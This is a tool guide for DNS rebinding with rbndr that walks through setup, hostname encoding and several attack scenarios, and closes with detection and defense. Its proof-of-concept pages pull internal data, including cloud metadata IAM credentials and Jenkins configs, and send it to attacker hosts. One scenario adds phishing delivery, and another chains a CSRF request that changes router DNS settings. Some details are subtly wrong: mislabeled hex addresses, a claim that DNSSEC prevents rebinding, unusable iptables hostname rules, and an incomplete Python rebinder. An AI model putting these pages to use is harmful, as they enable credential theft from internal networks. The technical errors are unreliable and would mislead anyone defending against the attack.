---
title: "DNS Rebinding (rbndr)"
category: "Initial Access"
tool_type: "DNS Rebinding Attack"
mitre_attack: ["TA0001: Initial Access", "T1557: Adversary-in-the-Middle"]
difficulty: "Advanced"
version: "N/A (rbndr / dns-rebind toolchain)"
author: "Tavis Ormandy (rbndr)"
license: "GPLv3"
language: "C"
install_method: "apt / compile from source"
kali_package: "dns-rebind"
official_url: "https://www.kali.org/tools/dns-rebind/"
github_url: "https://github.com/taviso/rbndr"
---

# DNS Rebinding — Exploiting Same-Origin Policy via DNS TTL Manipulation

## 1. Introduction & Overview

### What Is DNS Rebinding

DNS rebinding is an attack that converts a victim's browser into a proxy for reaching internal network services. The attacker registers a domain that resolves to an external IP (to pass the Same-Origin Policy check) then rebinds that same domain to an internal IP (e.g., `127.0.0.1` or `192.168.1.x`) on the next DNS query, exploiting the trust the browser placed in the initial resolution.

This is a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability. The browser checks the IP at page load (TOCTOU check), but by the time it makes follow-up requests (TOCTOU use), the DNS record has changed, and the browser happily sends requests to the internal target — bypassing firewalls, NAT, and the Same-Origin Policy entirely.

### History

- **Concept:** First described in academic research around 2007 (Collin Jackson et al.)
- **Tooling:** Tavis Ormandy's `rbndr` (rebinder) popularized practical DNS rebinding attacks
- **Kali Package:** `dns-rebind` includes multiple rebinding tools
- **Reference Implementation:** `taviso/rbndr` on GitHub — a minimal DNS server that alternates between two IPs per hostname with a very low TTL
- **Notable Exploits:** Adobe Flash, Oracle Java, and numerous browser plugins historically vulnerable to DNS rebinding

### When to Use

- Testing web applications that make server-side requests to user-supplied URLs (SSRF vectors)
- Exploiting services with flawed origin validation (e.g., CORS misconfigurations, CSRF tokens bound to origin)
- Bypassing network segmentation — accessing internal APIs, admin panels, or metadata endpoints from a browser
- Testing browser-based plugins or extensions that perform preflight security checks
- Assessing IoT devices that expose unauthenticated web interfaces on internal networks
- CTF challenges involving internal network pivoting

### When NOT to Use

- **Direct network exploitation** — use Nmap, Metasploit, or Responder for network-level attacks
- **Authentication bypass** — DNS rebinding does not bypass application-level auth, only network/origin restrictions
- **Non-authorized testing** — internal network testing requires explicit authorization
- **Targets with DNSSEC** — DNSSEC prevents rebinding by signing DNS records

### Legal Considerations

DNS rebinding attacks against internal infrastructure must be authorized. The attack technique can exfiltrate data from internal services (e.g., cloud metadata endpoints, internal admin panels). Written authorization covering the specific internal targets is essential.

### Key Concepts

| Concept | Definition |
|---------|-----------|
| **Same-Origin Policy (SOP)** | Browser security model restricting scripts to the origin that served them |
| **DNS TTL** | Time-To-Live; how long a DNS record is cached before re-querying |
| **Rebinding** | Changing DNS resolution from one IP to another for the same hostname |
| **TOCTOU** | Time-of-Check to Time-of-Use; race between verification and execution |
| **Preflight Check** | A security check performed before granting access (e.g., Flash's `crossdomain.xml`) |
| **SSRF** | Server-Side Request Forgery; DNS rebinding is a browser-side SSRF vector |
| **Base-16 Encoding** | Hex encoding of IP addresses used in rbndr hostnames |

### How DNS Rebinding Works (Technical Flow)

1. Attacker controls a domain (e.g., `evil.com`) and a custom DNS server
2. Victim visits `evil.com` — DNS resolves to attacker's server IP (e.g., `203.0.113.1`)
3. Attacker's page performs a preflight check or security validation — succeeds because IP is external
4. DNS TTL expires (set to ~0 seconds on first response)
5. Browser re-queries DNS for `evil.com`
6. Attacker's DNS server now returns `127.0.0.1` (or any internal IP)
7. Browser's JavaScript now communicates with `127.0.0.1` as if it were `evil.com` — Same-Origin Policy allows it because the hostname matches
8. Attacker exfiltrates internal data through the re-bound connection

---

## 2. Installation & Setup

### Requirements

- Kali Linux (or equivalent)
- Control over a DNS server (for production attacks)
- For local testing: `/etc/hosts` or a local DNS server
- Python 3 (for some rebinding tools)

### Installation Methods

**From Kali repositories:**

```bash
sudo apt update && sudo apt install dns-rebind
```

**rbndr from source:**

```bash
git clone https://github.com/taviso/rbndr.git
cd rbndr
gcc -o rbndr rebinder.c
```

**Alternative: rbndr Python implementation:**

```bash
git clone https://github.com/taviso/rbndr.git
cd rbndr
python3 rebinder.py  # Some forks include a Python version
```

### Configuration

**rbndr** requires no configuration file. It operates as a standalone DNS server. For production use, you need:

1. A registered domain name
2. Authority over DNS records (domain registrar or DNS hosting provider)
3. A server running on port 53 (UDP) to serve DNS responses

### Verification

```bash
rbndr --help
# or verify the binary
./rbndr
```

Test DNS resolution:

```bash
host 7f000001.c0a80001.rbndr.us
# Should return either 127.0.0.1 or 192.168.0.1 randomly
```

---

## 3. Basic Usage

### First Run — rbndr Service

rbndr is a DNS server, not a command-line tool. It listens on UDP port 53 and responds to DNS queries for hostnames encoded as hex IPs:

```bash
# Run rbndr on port 53 (requires root)
sudo ./rbndr
```

**Explanation:** Starts the DNS server on UDP port 53. Hostnames matching the pattern `<hex-ip>.<hex-ip>.rbndr.us` will resolve to one of the two IPs randomly with a very low TTL.

### Encoding IP Addresses

rbndr uses base-16 (hexadecimal) encoding for IP addresses in the hostname format:

```
<ipv4-hex>.<ipv4-hex>.rbndr.us
```

**Conversion examples:**

| Dotted Quad | Hex Encoding |
|-------------|-------------|
| `127.0.0.1` | `7f000001` |
| `192.168.0.1` | `c0a80001` |
| `10.0.0.1` | `0a000001` |
| `192.168.1.100` | `c0a80164` |
| `172.16.0.1` | `ac100001` |

**Convert manually:**

```bash
# 127.0.0.1 -> 7f000001
python3 -c "import struct; print(hex(struct.unpack('!I', b'\\x7f\\x00\\x00\\x01')[0])[2:])"
```

**Use rbndr's web calculator:**

Visit `https://lock.cmpxchg8b.com/rebinder.html` to convert dotted quads to rbndr hostname format interactively.

### Basic Rebinding Hostname

To switch between `127.0.0.1` and `192.168.0.1`:

```
7f000001.c0a80001.rbndr.us
```

**Test it:**

```bash
host 7f000001.c0a80001.rbndr.us
# First query might return 192.168.0.1
host 7f000001.c0a80001.rbndr.us
# Second query might return 127.0.0.1
host 7f000001.c0a80001.rbndr.us
# Randomly alternates
```

**Explanation:** Each DNS query returns one of the two IPs with a ~0 second TTL, forcing the browser to re-query frequently and enabling rebinding.

### Using with dnsmasq (Local Testing)

For local testing without registering a domain:

```bash
# Install dnsmasq
sudo apt install dnsmasq

# Configure dnsmasq to respond with alternating IPs
echo "address=/evil.com/203.0.113.1" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl restart dnsmasq
```

**For actual rebinding behavior, use rbndr or a custom DNS server.**

### Basic Attack Scenario (Proof of Concept)

```html
<!DOCTYPE html>
<html>
<head><title>DNS Rebinding PoC</title></head>
<body>
<script>
// Phase 1: Rebinding hostname resolves to 127.0.0.1
// This PoC uses the rbndr service
var target = "7f000001.c0a80001.rbndr.us";

// Wait for rebind, then make requests to internal service
function exploit() {
    fetch("http://" + target + ":8080/admin/config")
        .then(r => r.text())
        .then(data => {
            // Exfiltrate data to attacker server
            new Image().src = "http://attacker.example.com/steal?data=" + btoa(data);
        })
        .catch(e => {
            // If failed, retry (waiting for rebind)
            setTimeout(exploit, 1000);
        });
}

// Trigger initial resolution (to pass preflight check)
exploit();
</script>
</body>
</html>
```

**Explanation:** This PoC page, when visited by a victim, will repeatedly attempt to access `127.0.0.1:8080` through the re-bound domain, eventually succeeding when the DNS record switches.

---

## 4. Intermediate Usage

### Integrating with Metasploit

DNS rebinding can be combined with Metasploit modules for exploitation:

```bash
# Use Metasploit's auxiliary module for SSRF testing
msfconsole -q
use auxiliary/server/dns_rebinding
set SRVHOST 0.0.0.0
set SRVPORT 53
set TARGETURI http://192.168.1.100/api/internal
run
```

**Explanation:** Metasploit's DNS rebinding module serves as a DNS server that alternates between two IPs, facilitating browser-based SSRF exploitation.

### Chaining with Web Proxies

Route rebinding traffic through Burp Suite for inspection:

```bash
# Configure Burp as proxy on 127.0.0.1:8080
# Then use a browser with proxy configured to test rebinding

# Manual test with curl through proxy
curl -x http://127.0.0.1:8080 http://7f000001.c0a80001.rbndr.us:8080/admin
```

**Explanation:** The proxy intercepts the rebinding requests, allowing you to observe the IP switching behavior and craft payloads accordingly.

### Attacking Cloud Metadata Endpoints

A common high-impact target:

```bash
# Encode the cloud metadata endpoint
# AWS metadata: 169.254.169.254 -> a9fea0fe
# GCP metadata: 169.254.169.254 -> a9fea0fe

# rbndr hostname
host a9fea0fe.c0a80001.rbndr.us
```

**Attack flow:**
1. Victim visits attacker's page
2. DNS resolves to attacker's IP (passes initial check)
3. Rebinds to `169.254.169.254` (cloud metadata)
4. Attacker's JavaScript reads instance credentials, IAM roles, user-data

### Attacking Internal Web UIs

Target router admin panels, Jenkins dashboards, or other internal services:

```bash
# Target: 192.168.1.1 (router admin)
# Encode: c0a80001

# rbndr hostname
host c0a80001.0a000001.rbndr.us
# Alternates between 192.168.1.1 and 10.0.0.1
```

**Explanation:** The browser thinks it's communicating with `c0a80001.0a000001.rbndr.us` (a single origin), but the actual IP switches between the router and the attacker's server.

### Automation Scripts

**Python rebinding script for local testing:**

```python
import socket
import threading
import random

class SimpleDNSRebinder:
    def __init__(self, ip1, ip2, port=53):
        self.ip1 = ip1
        self.ip2 = ip2
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def start(self):
        self.sock.bind(('0.0.0.0', self.port))
        print(f"DNS rebinder listening on port {self.port}")
        while True:
            data, addr = self.sock.recvfrom(512)
            thread = threading.Thread(target=self.handle_query, args=(data, addr))
            thread.daemon = True
            thread.start()
    
    def handle_query(self, data, addr):
        # Parse DNS query and respond with alternating IPs
        response = self.build_response(data)
        chosen_ip = random.choice([self.ip1, self.ip2])
        print(f"Responding to {addr}: {chosen_ip}")
        self.sock.sendto(response, addr)
```

**Explanation:** A minimal DNS server that alternates between two IPs, suitable for local testing without external DNS hosting.

### Using DNS Rebinding with curl

```bash
# Test internal endpoint through rebind
curl -H "Host: 7f000001.c0a80001.rbndr.us" \
  http://7f000001.c0a80001.rbndr.us:8080/api/config \
  --resolve 7f000001.c0a80001.rbndr.us:8080:127.0.0.1
```

**Explanation:** The `--resolve` flag forces curl to resolve the hostname to a specific IP, simulating the rebinding behavior.

---

## 5. Advanced Usage

### DNS Over HTTPS (DoH) Rebinding

Modern browsers support DoH, which complicates rebinding:

```bash
# Test with DoH disabled
# Firefox: about:config -> network.trr.mode -> 0
# Chrome: chrome://settings/security -> disable "Use secure DNS"

# Verify DoH is off
curl -v --doh-insecure https://dns.google/resolve?name=evil.com
```

**Explanation:** DoH providers may cache DNS records longer than TTL, making rebinding harder. Disable DoH for testing.

### Browser-Based Rebinding Detection

Check if a browser is vulnerable to rebinding:

```html
<script>
// Attempt to reach localhost through rebinding
var test = new XMLHttpRequest();
test.open("GET", "http://7f000001.c0a80001.rbndr.us:8080/test", true);
test.onload = function() {
    document.getElementById("result").innerHTML = "VULNERABLE: " + test.responseText;
};
test.onerror = function() {
    document.getElementById("result").innerHTML = "Not vulnerable (or service unreachable)";
};
test.send();
</script>
```

**Explanation:** If the XHR succeeds, the browser is vulnerable to DNS rebinding against the target service.

### Advanced Rebinding with Subdomain Wildcards

```bash
# Register *.attacker.com with NS records pointing to your rbndr server
# Then use subdomains for unique rebinding pairs

# First subdomain: 127.0.0.1 <-> 192.168.1.1
host a.7f000001.c0a80001.attacker.com

# Second subdomain: 10.0.0.1 <-> 172.16.0.1
host b.0a000001.ac100001.attacker.com
```

**Explanation:** Wildcard subdomains allow multiple simultaneous rebinding targets without registering separate domains.

### Chaining with CSRF Attacks

DNS rebinding amplifies CSRF by allowing the attacker to reach internal services:

```javascript
// Step 1: Rebind to internal router
// Step 2: Submit CSRF form to change DNS settings
fetch("http://rebind-target:80/admin/dns", {
    method: "POST",
    body: "dns1=8.8.8.8&dns2=1.1.1.1",
    credentials: "include"
});
```

**Explanation:** The re-bound domain can submit authenticated requests to internal services, chaining CSRF with DNS rebinding for full compromise.

### Anti-Rebinding Defenses to Test

When assessing rebinding defenses:

1. **DNS pinning** — browsers cache DNS results for the session
2. **Certificate pinning** — prevents HTTPS rebinding
3. **DNSSEC** — validates DNS response integrity
4. **IP-based access control** — blocks cross-origin requests to internal IPs
5. **Network-level segmentation** — prevents browser from reaching internal services

Test these defenses:

```bash
# Test DNS pinning bypass
# Use very low TTL (0 seconds) and rapid page refreshes
curl -v http://7f000001.c0a80001.rbndr.us --dns-servers 127.0.0.1
```

---

## 6. Real-World Scenarios

### Scenario 1: Enterprise Network Assessment — Accessing Internal Admin Panels

An internal Jenkins dashboard at `http://192.168.1.50:8080` is not accessible from the internet. The goal is to exfiltrate configuration data.

**Step 1 — Set up rbndr on attacker-controlled server:**

```bash
sudo ./rbndr  # On attacker server at 203.0.113.100
```

**Step 2 — Register DNS:**

```
# NS record: evil.com -> 203.0.113.100
# Attacker's DNS server handles all queries for evil.com
```

**Step 3 — Create malicious page:**

```html
<script>
var rebinding = "7f000001.c0a80001.rbndr.us";
// 127.0.0.1 (rebind target) <-> 192.168.1.100 (attacker)

function tryAccess() {
    fetch("http://" + rebinding + ":8080/api/script?name=config.xml")
        .then(r => r.text())
        .then(d => {
            new Image().src = "http://203.0.113.100/exfil?data=" + encodeURIComponent(d);
        })
        .catch(() => setTimeout(tryAccess, 2000));
}
tryAccess();
</script>
```

**Step 4 — Deliver to victim** via phishing or existing access. When the victim's browser resolves the domain, it alternates between the attacker's server and `127.0.0.1`, eventually reaching the internal Jenkins instance.

### Scenario 2: CTF Challenge — Pivoting Through a Browser

A CTF challenge provides a web browser in a sandboxed environment with access to an internal network. The goal: read the flag from `http://internal.target.local:3000/flag`.

```bash
# Host rbndr on your server
sudo ./rbndr

# Craft URL to deliver to the sandboxed browser
# Encodes internal.target.local's IP
host c0a80001.0a000001.rbndr.us  # 192.168.0.1 <-> 10.0.0.1
```

**Create the exploit page:**

```html
<script>
// Rebind to internal target
var host = "c0a80001.0a000001.rbndr.us";
fetch("http://" + host + ":3000/flag")
    .then(r => r.text())
    .then(f => document.body.innerText = f)
    .catch(() => location.reload());
</script>
```

### Scenario 3: Bug Bounty — SSRF via DNS Rebinding in JavaScript

A bug bounty target has a JavaScript application that fetches user-provided URLs server-side for screenshot functionality. The server validates the URL origin but DNS rebinding bypasses this.

**Proof of concept:**

```html
<script>
// Step 1: Initial resolution to external IP (passes check)
// Step 2: Rebind to internal metadata endpoint
var s = "a9fea0fe.c0a80001.rbndr.us"; // 169.254.169.254 <-> 192.168.0.1

fetch("http://" + s + "/latest/meta-data/iam/security-credentials/")
    .then(r => r.text())
    .then(d => {
        // Exfiltrate AWS credentials
        fetch("https://attacker.example.com/log", {
            method: "POST",
            body: d
        });
    });
</script>
```

**Explanation:** This demonstrates cloud credential exfiltration via DNS rebinding through a legitimate application feature.

---

## 7. Detection & Defense

### Detection Signatures

**DNS query anomalies:**

```bash
# Monitor for unusual DNS patterns
# Single hostname resolving to vastly different IPs
tcpdump -i eth0 port 53 -n | grep "A?" | awk '{print $NF}' | sort | uniq -c | sort -rn
```

**Low-TTL detection:**

```bash
# Detect DNS responses with TTL < 10 seconds
tcpdump -i eth0 port 53 -n -v 2>&1 | grep "ttl" | awk -F'ttl ' '{print $2}' | awk '{print $1}'
```

**Browser-level detection:**

```javascript
// Check if DNS resolution changed for a hostname
var resolver = document.createElement("img");
resolver.src = "//" + location.hostname + "/resolve?" + Date.now();
```

### Mitigation Strategies

1. **DNS pinning** — Cache DNS results for the lifetime of the page/session
2. **DNSSEC validation** — Prevents tampering with DNS responses
3. **IP-based CORS restrictions** — Block cross-origin requests to RFC 1918/private IPs
4. **Network segmentation** — Prevent browsers from reaching internal services
5. **HTTPS-only internal services** — Prevents HTTP rebinding
6. **Certificate pinning** — Prevents MITM on HTTPS connections
7. **Content Security Policy** — Restrict outbound connections
8. **Browser updates** — Modern browsers implement DNS pinning and rebinding mitigations

### Recommended Detection Tools

- **Zeek (Bro)** — Network monitoring with DNS analysis
- **Suricata** — IDS/IPS with DNS anomaly detection
- **PassiveDNS** — Log all DNS queries for analysis
- **Pi-hole / DNS sinkhole** — Block known rebinding domains

### Enterprise Defenses

```bash
# Deploy DNS firewall rules
# Block known rebinding domains
iptables -A OUTPUT -d 7f000001.c0a80001.rbndr.us -j DROP

# Block all rbndr.us traffic
iptables -A OUTPUT -d *.rbndr.us -j DROP

# Monitor for DNS rebinding patterns
# Alert on single hostname resolving to multiple IPs within short TTL
```

---

## 8. Troubleshooting

### Common Errors

**"bind: Address already in use" on port 53:**

```bash
# Kill any existing DNS server
sudo fuser -k 53/udp
# Or use a different port
sudo ./rbndr -p 5335
```

**DNS queries not resolving:**

```bash
# Test with dig instead of host
dig @127.0.0.1 7f000001.c0a80001.rbndr.us

# Check if rbndr is running
ss -ulnp | grep 53
```

**Browser not re-querying DNS:**

```bash
# Force DNS cache flush
# Chrome: chrome://net-internals/#dns -> Clear host cache
# Firefox: about:networking#dns -> Clear DNS Cache

# Verify TTL is low enough
dig +ttlunit 7f000001.c0a80001.rbndr.us
```

**Rebinding not working in Chrome:**

```bash
# Disable built-in rebinding protection for testing
# Launch Chrome with flag
google-chrome --disable-web-security --user-data-dir=/tmp/chrome-test
```

**Connection refused after rebind:**

```bash
# Verify the target service is running on the rebind IP
curl http://127.0.0.1:8080/test
# Check firewall rules
iptables -L -n | grep 8080
```

### FAQ

**Q: Does DNS rebinding work over HTTPS?**
A: It depends on certificate validation. If the rebind target uses a valid certificate for the hostname (e.g., Let's Encrypt wildcard), HTTPS rebinding works. Otherwise, certificate errors block the connection.

**Q: Can DNS rebinding bypass CORS?**
A: Yes, if the target service's CORS policy trusts the rebind hostname. Many misconfigured CORS policies allow any origin, making rebinding trivially exploitable.

**Q: Is DNS rebinding legal?**
A: Testing against systems you own or have written authorization to test is legal. Rebinding against systems without authorization is unauthorized access.

**Q: Do modern browsers prevent DNS rebinding?**
A: Most modern browsers implement some form of DNS pinning that limits rebinding. However, many bypass techniques exist, and older browsers are fully vulnerable.

**Q: What about DNS-over-HTTPS (DoH)?**
A: DoH can actually help attackers by bypassing corporate DNS monitoring, but it also adds caching that may slow rebinding. The impact depends on the DoH provider's caching policy.

---

## Resources

- [rbndr - Tavis Ormandy](https://github.com/taviso/rbndr)
- [DNS Rebinding Wikipedia](https://en.wikipedia.org/wiki/DNS_rebinding)
- [rbndr Hostname Calculator](https://lock.cmpxchg8b.com/rebinder.html)
- [OWASP DNS Rebinding](https://owasp.org/www-community/attacks/DNS_Rebinding)
- [Academic Paper: The Curious Case of the Digital Cosmos](https://ieeexplore.ieee.org/document/4221025)
- [MITRE ATT&CK T1557](https://attack.mitre.org/techniques/T1557/)
- [Kali Package Page](https://www.kali.org/tools/dns-rebind/)
- [Browser DNS Pinning Research](https://github.com/nccgroup/singularity)
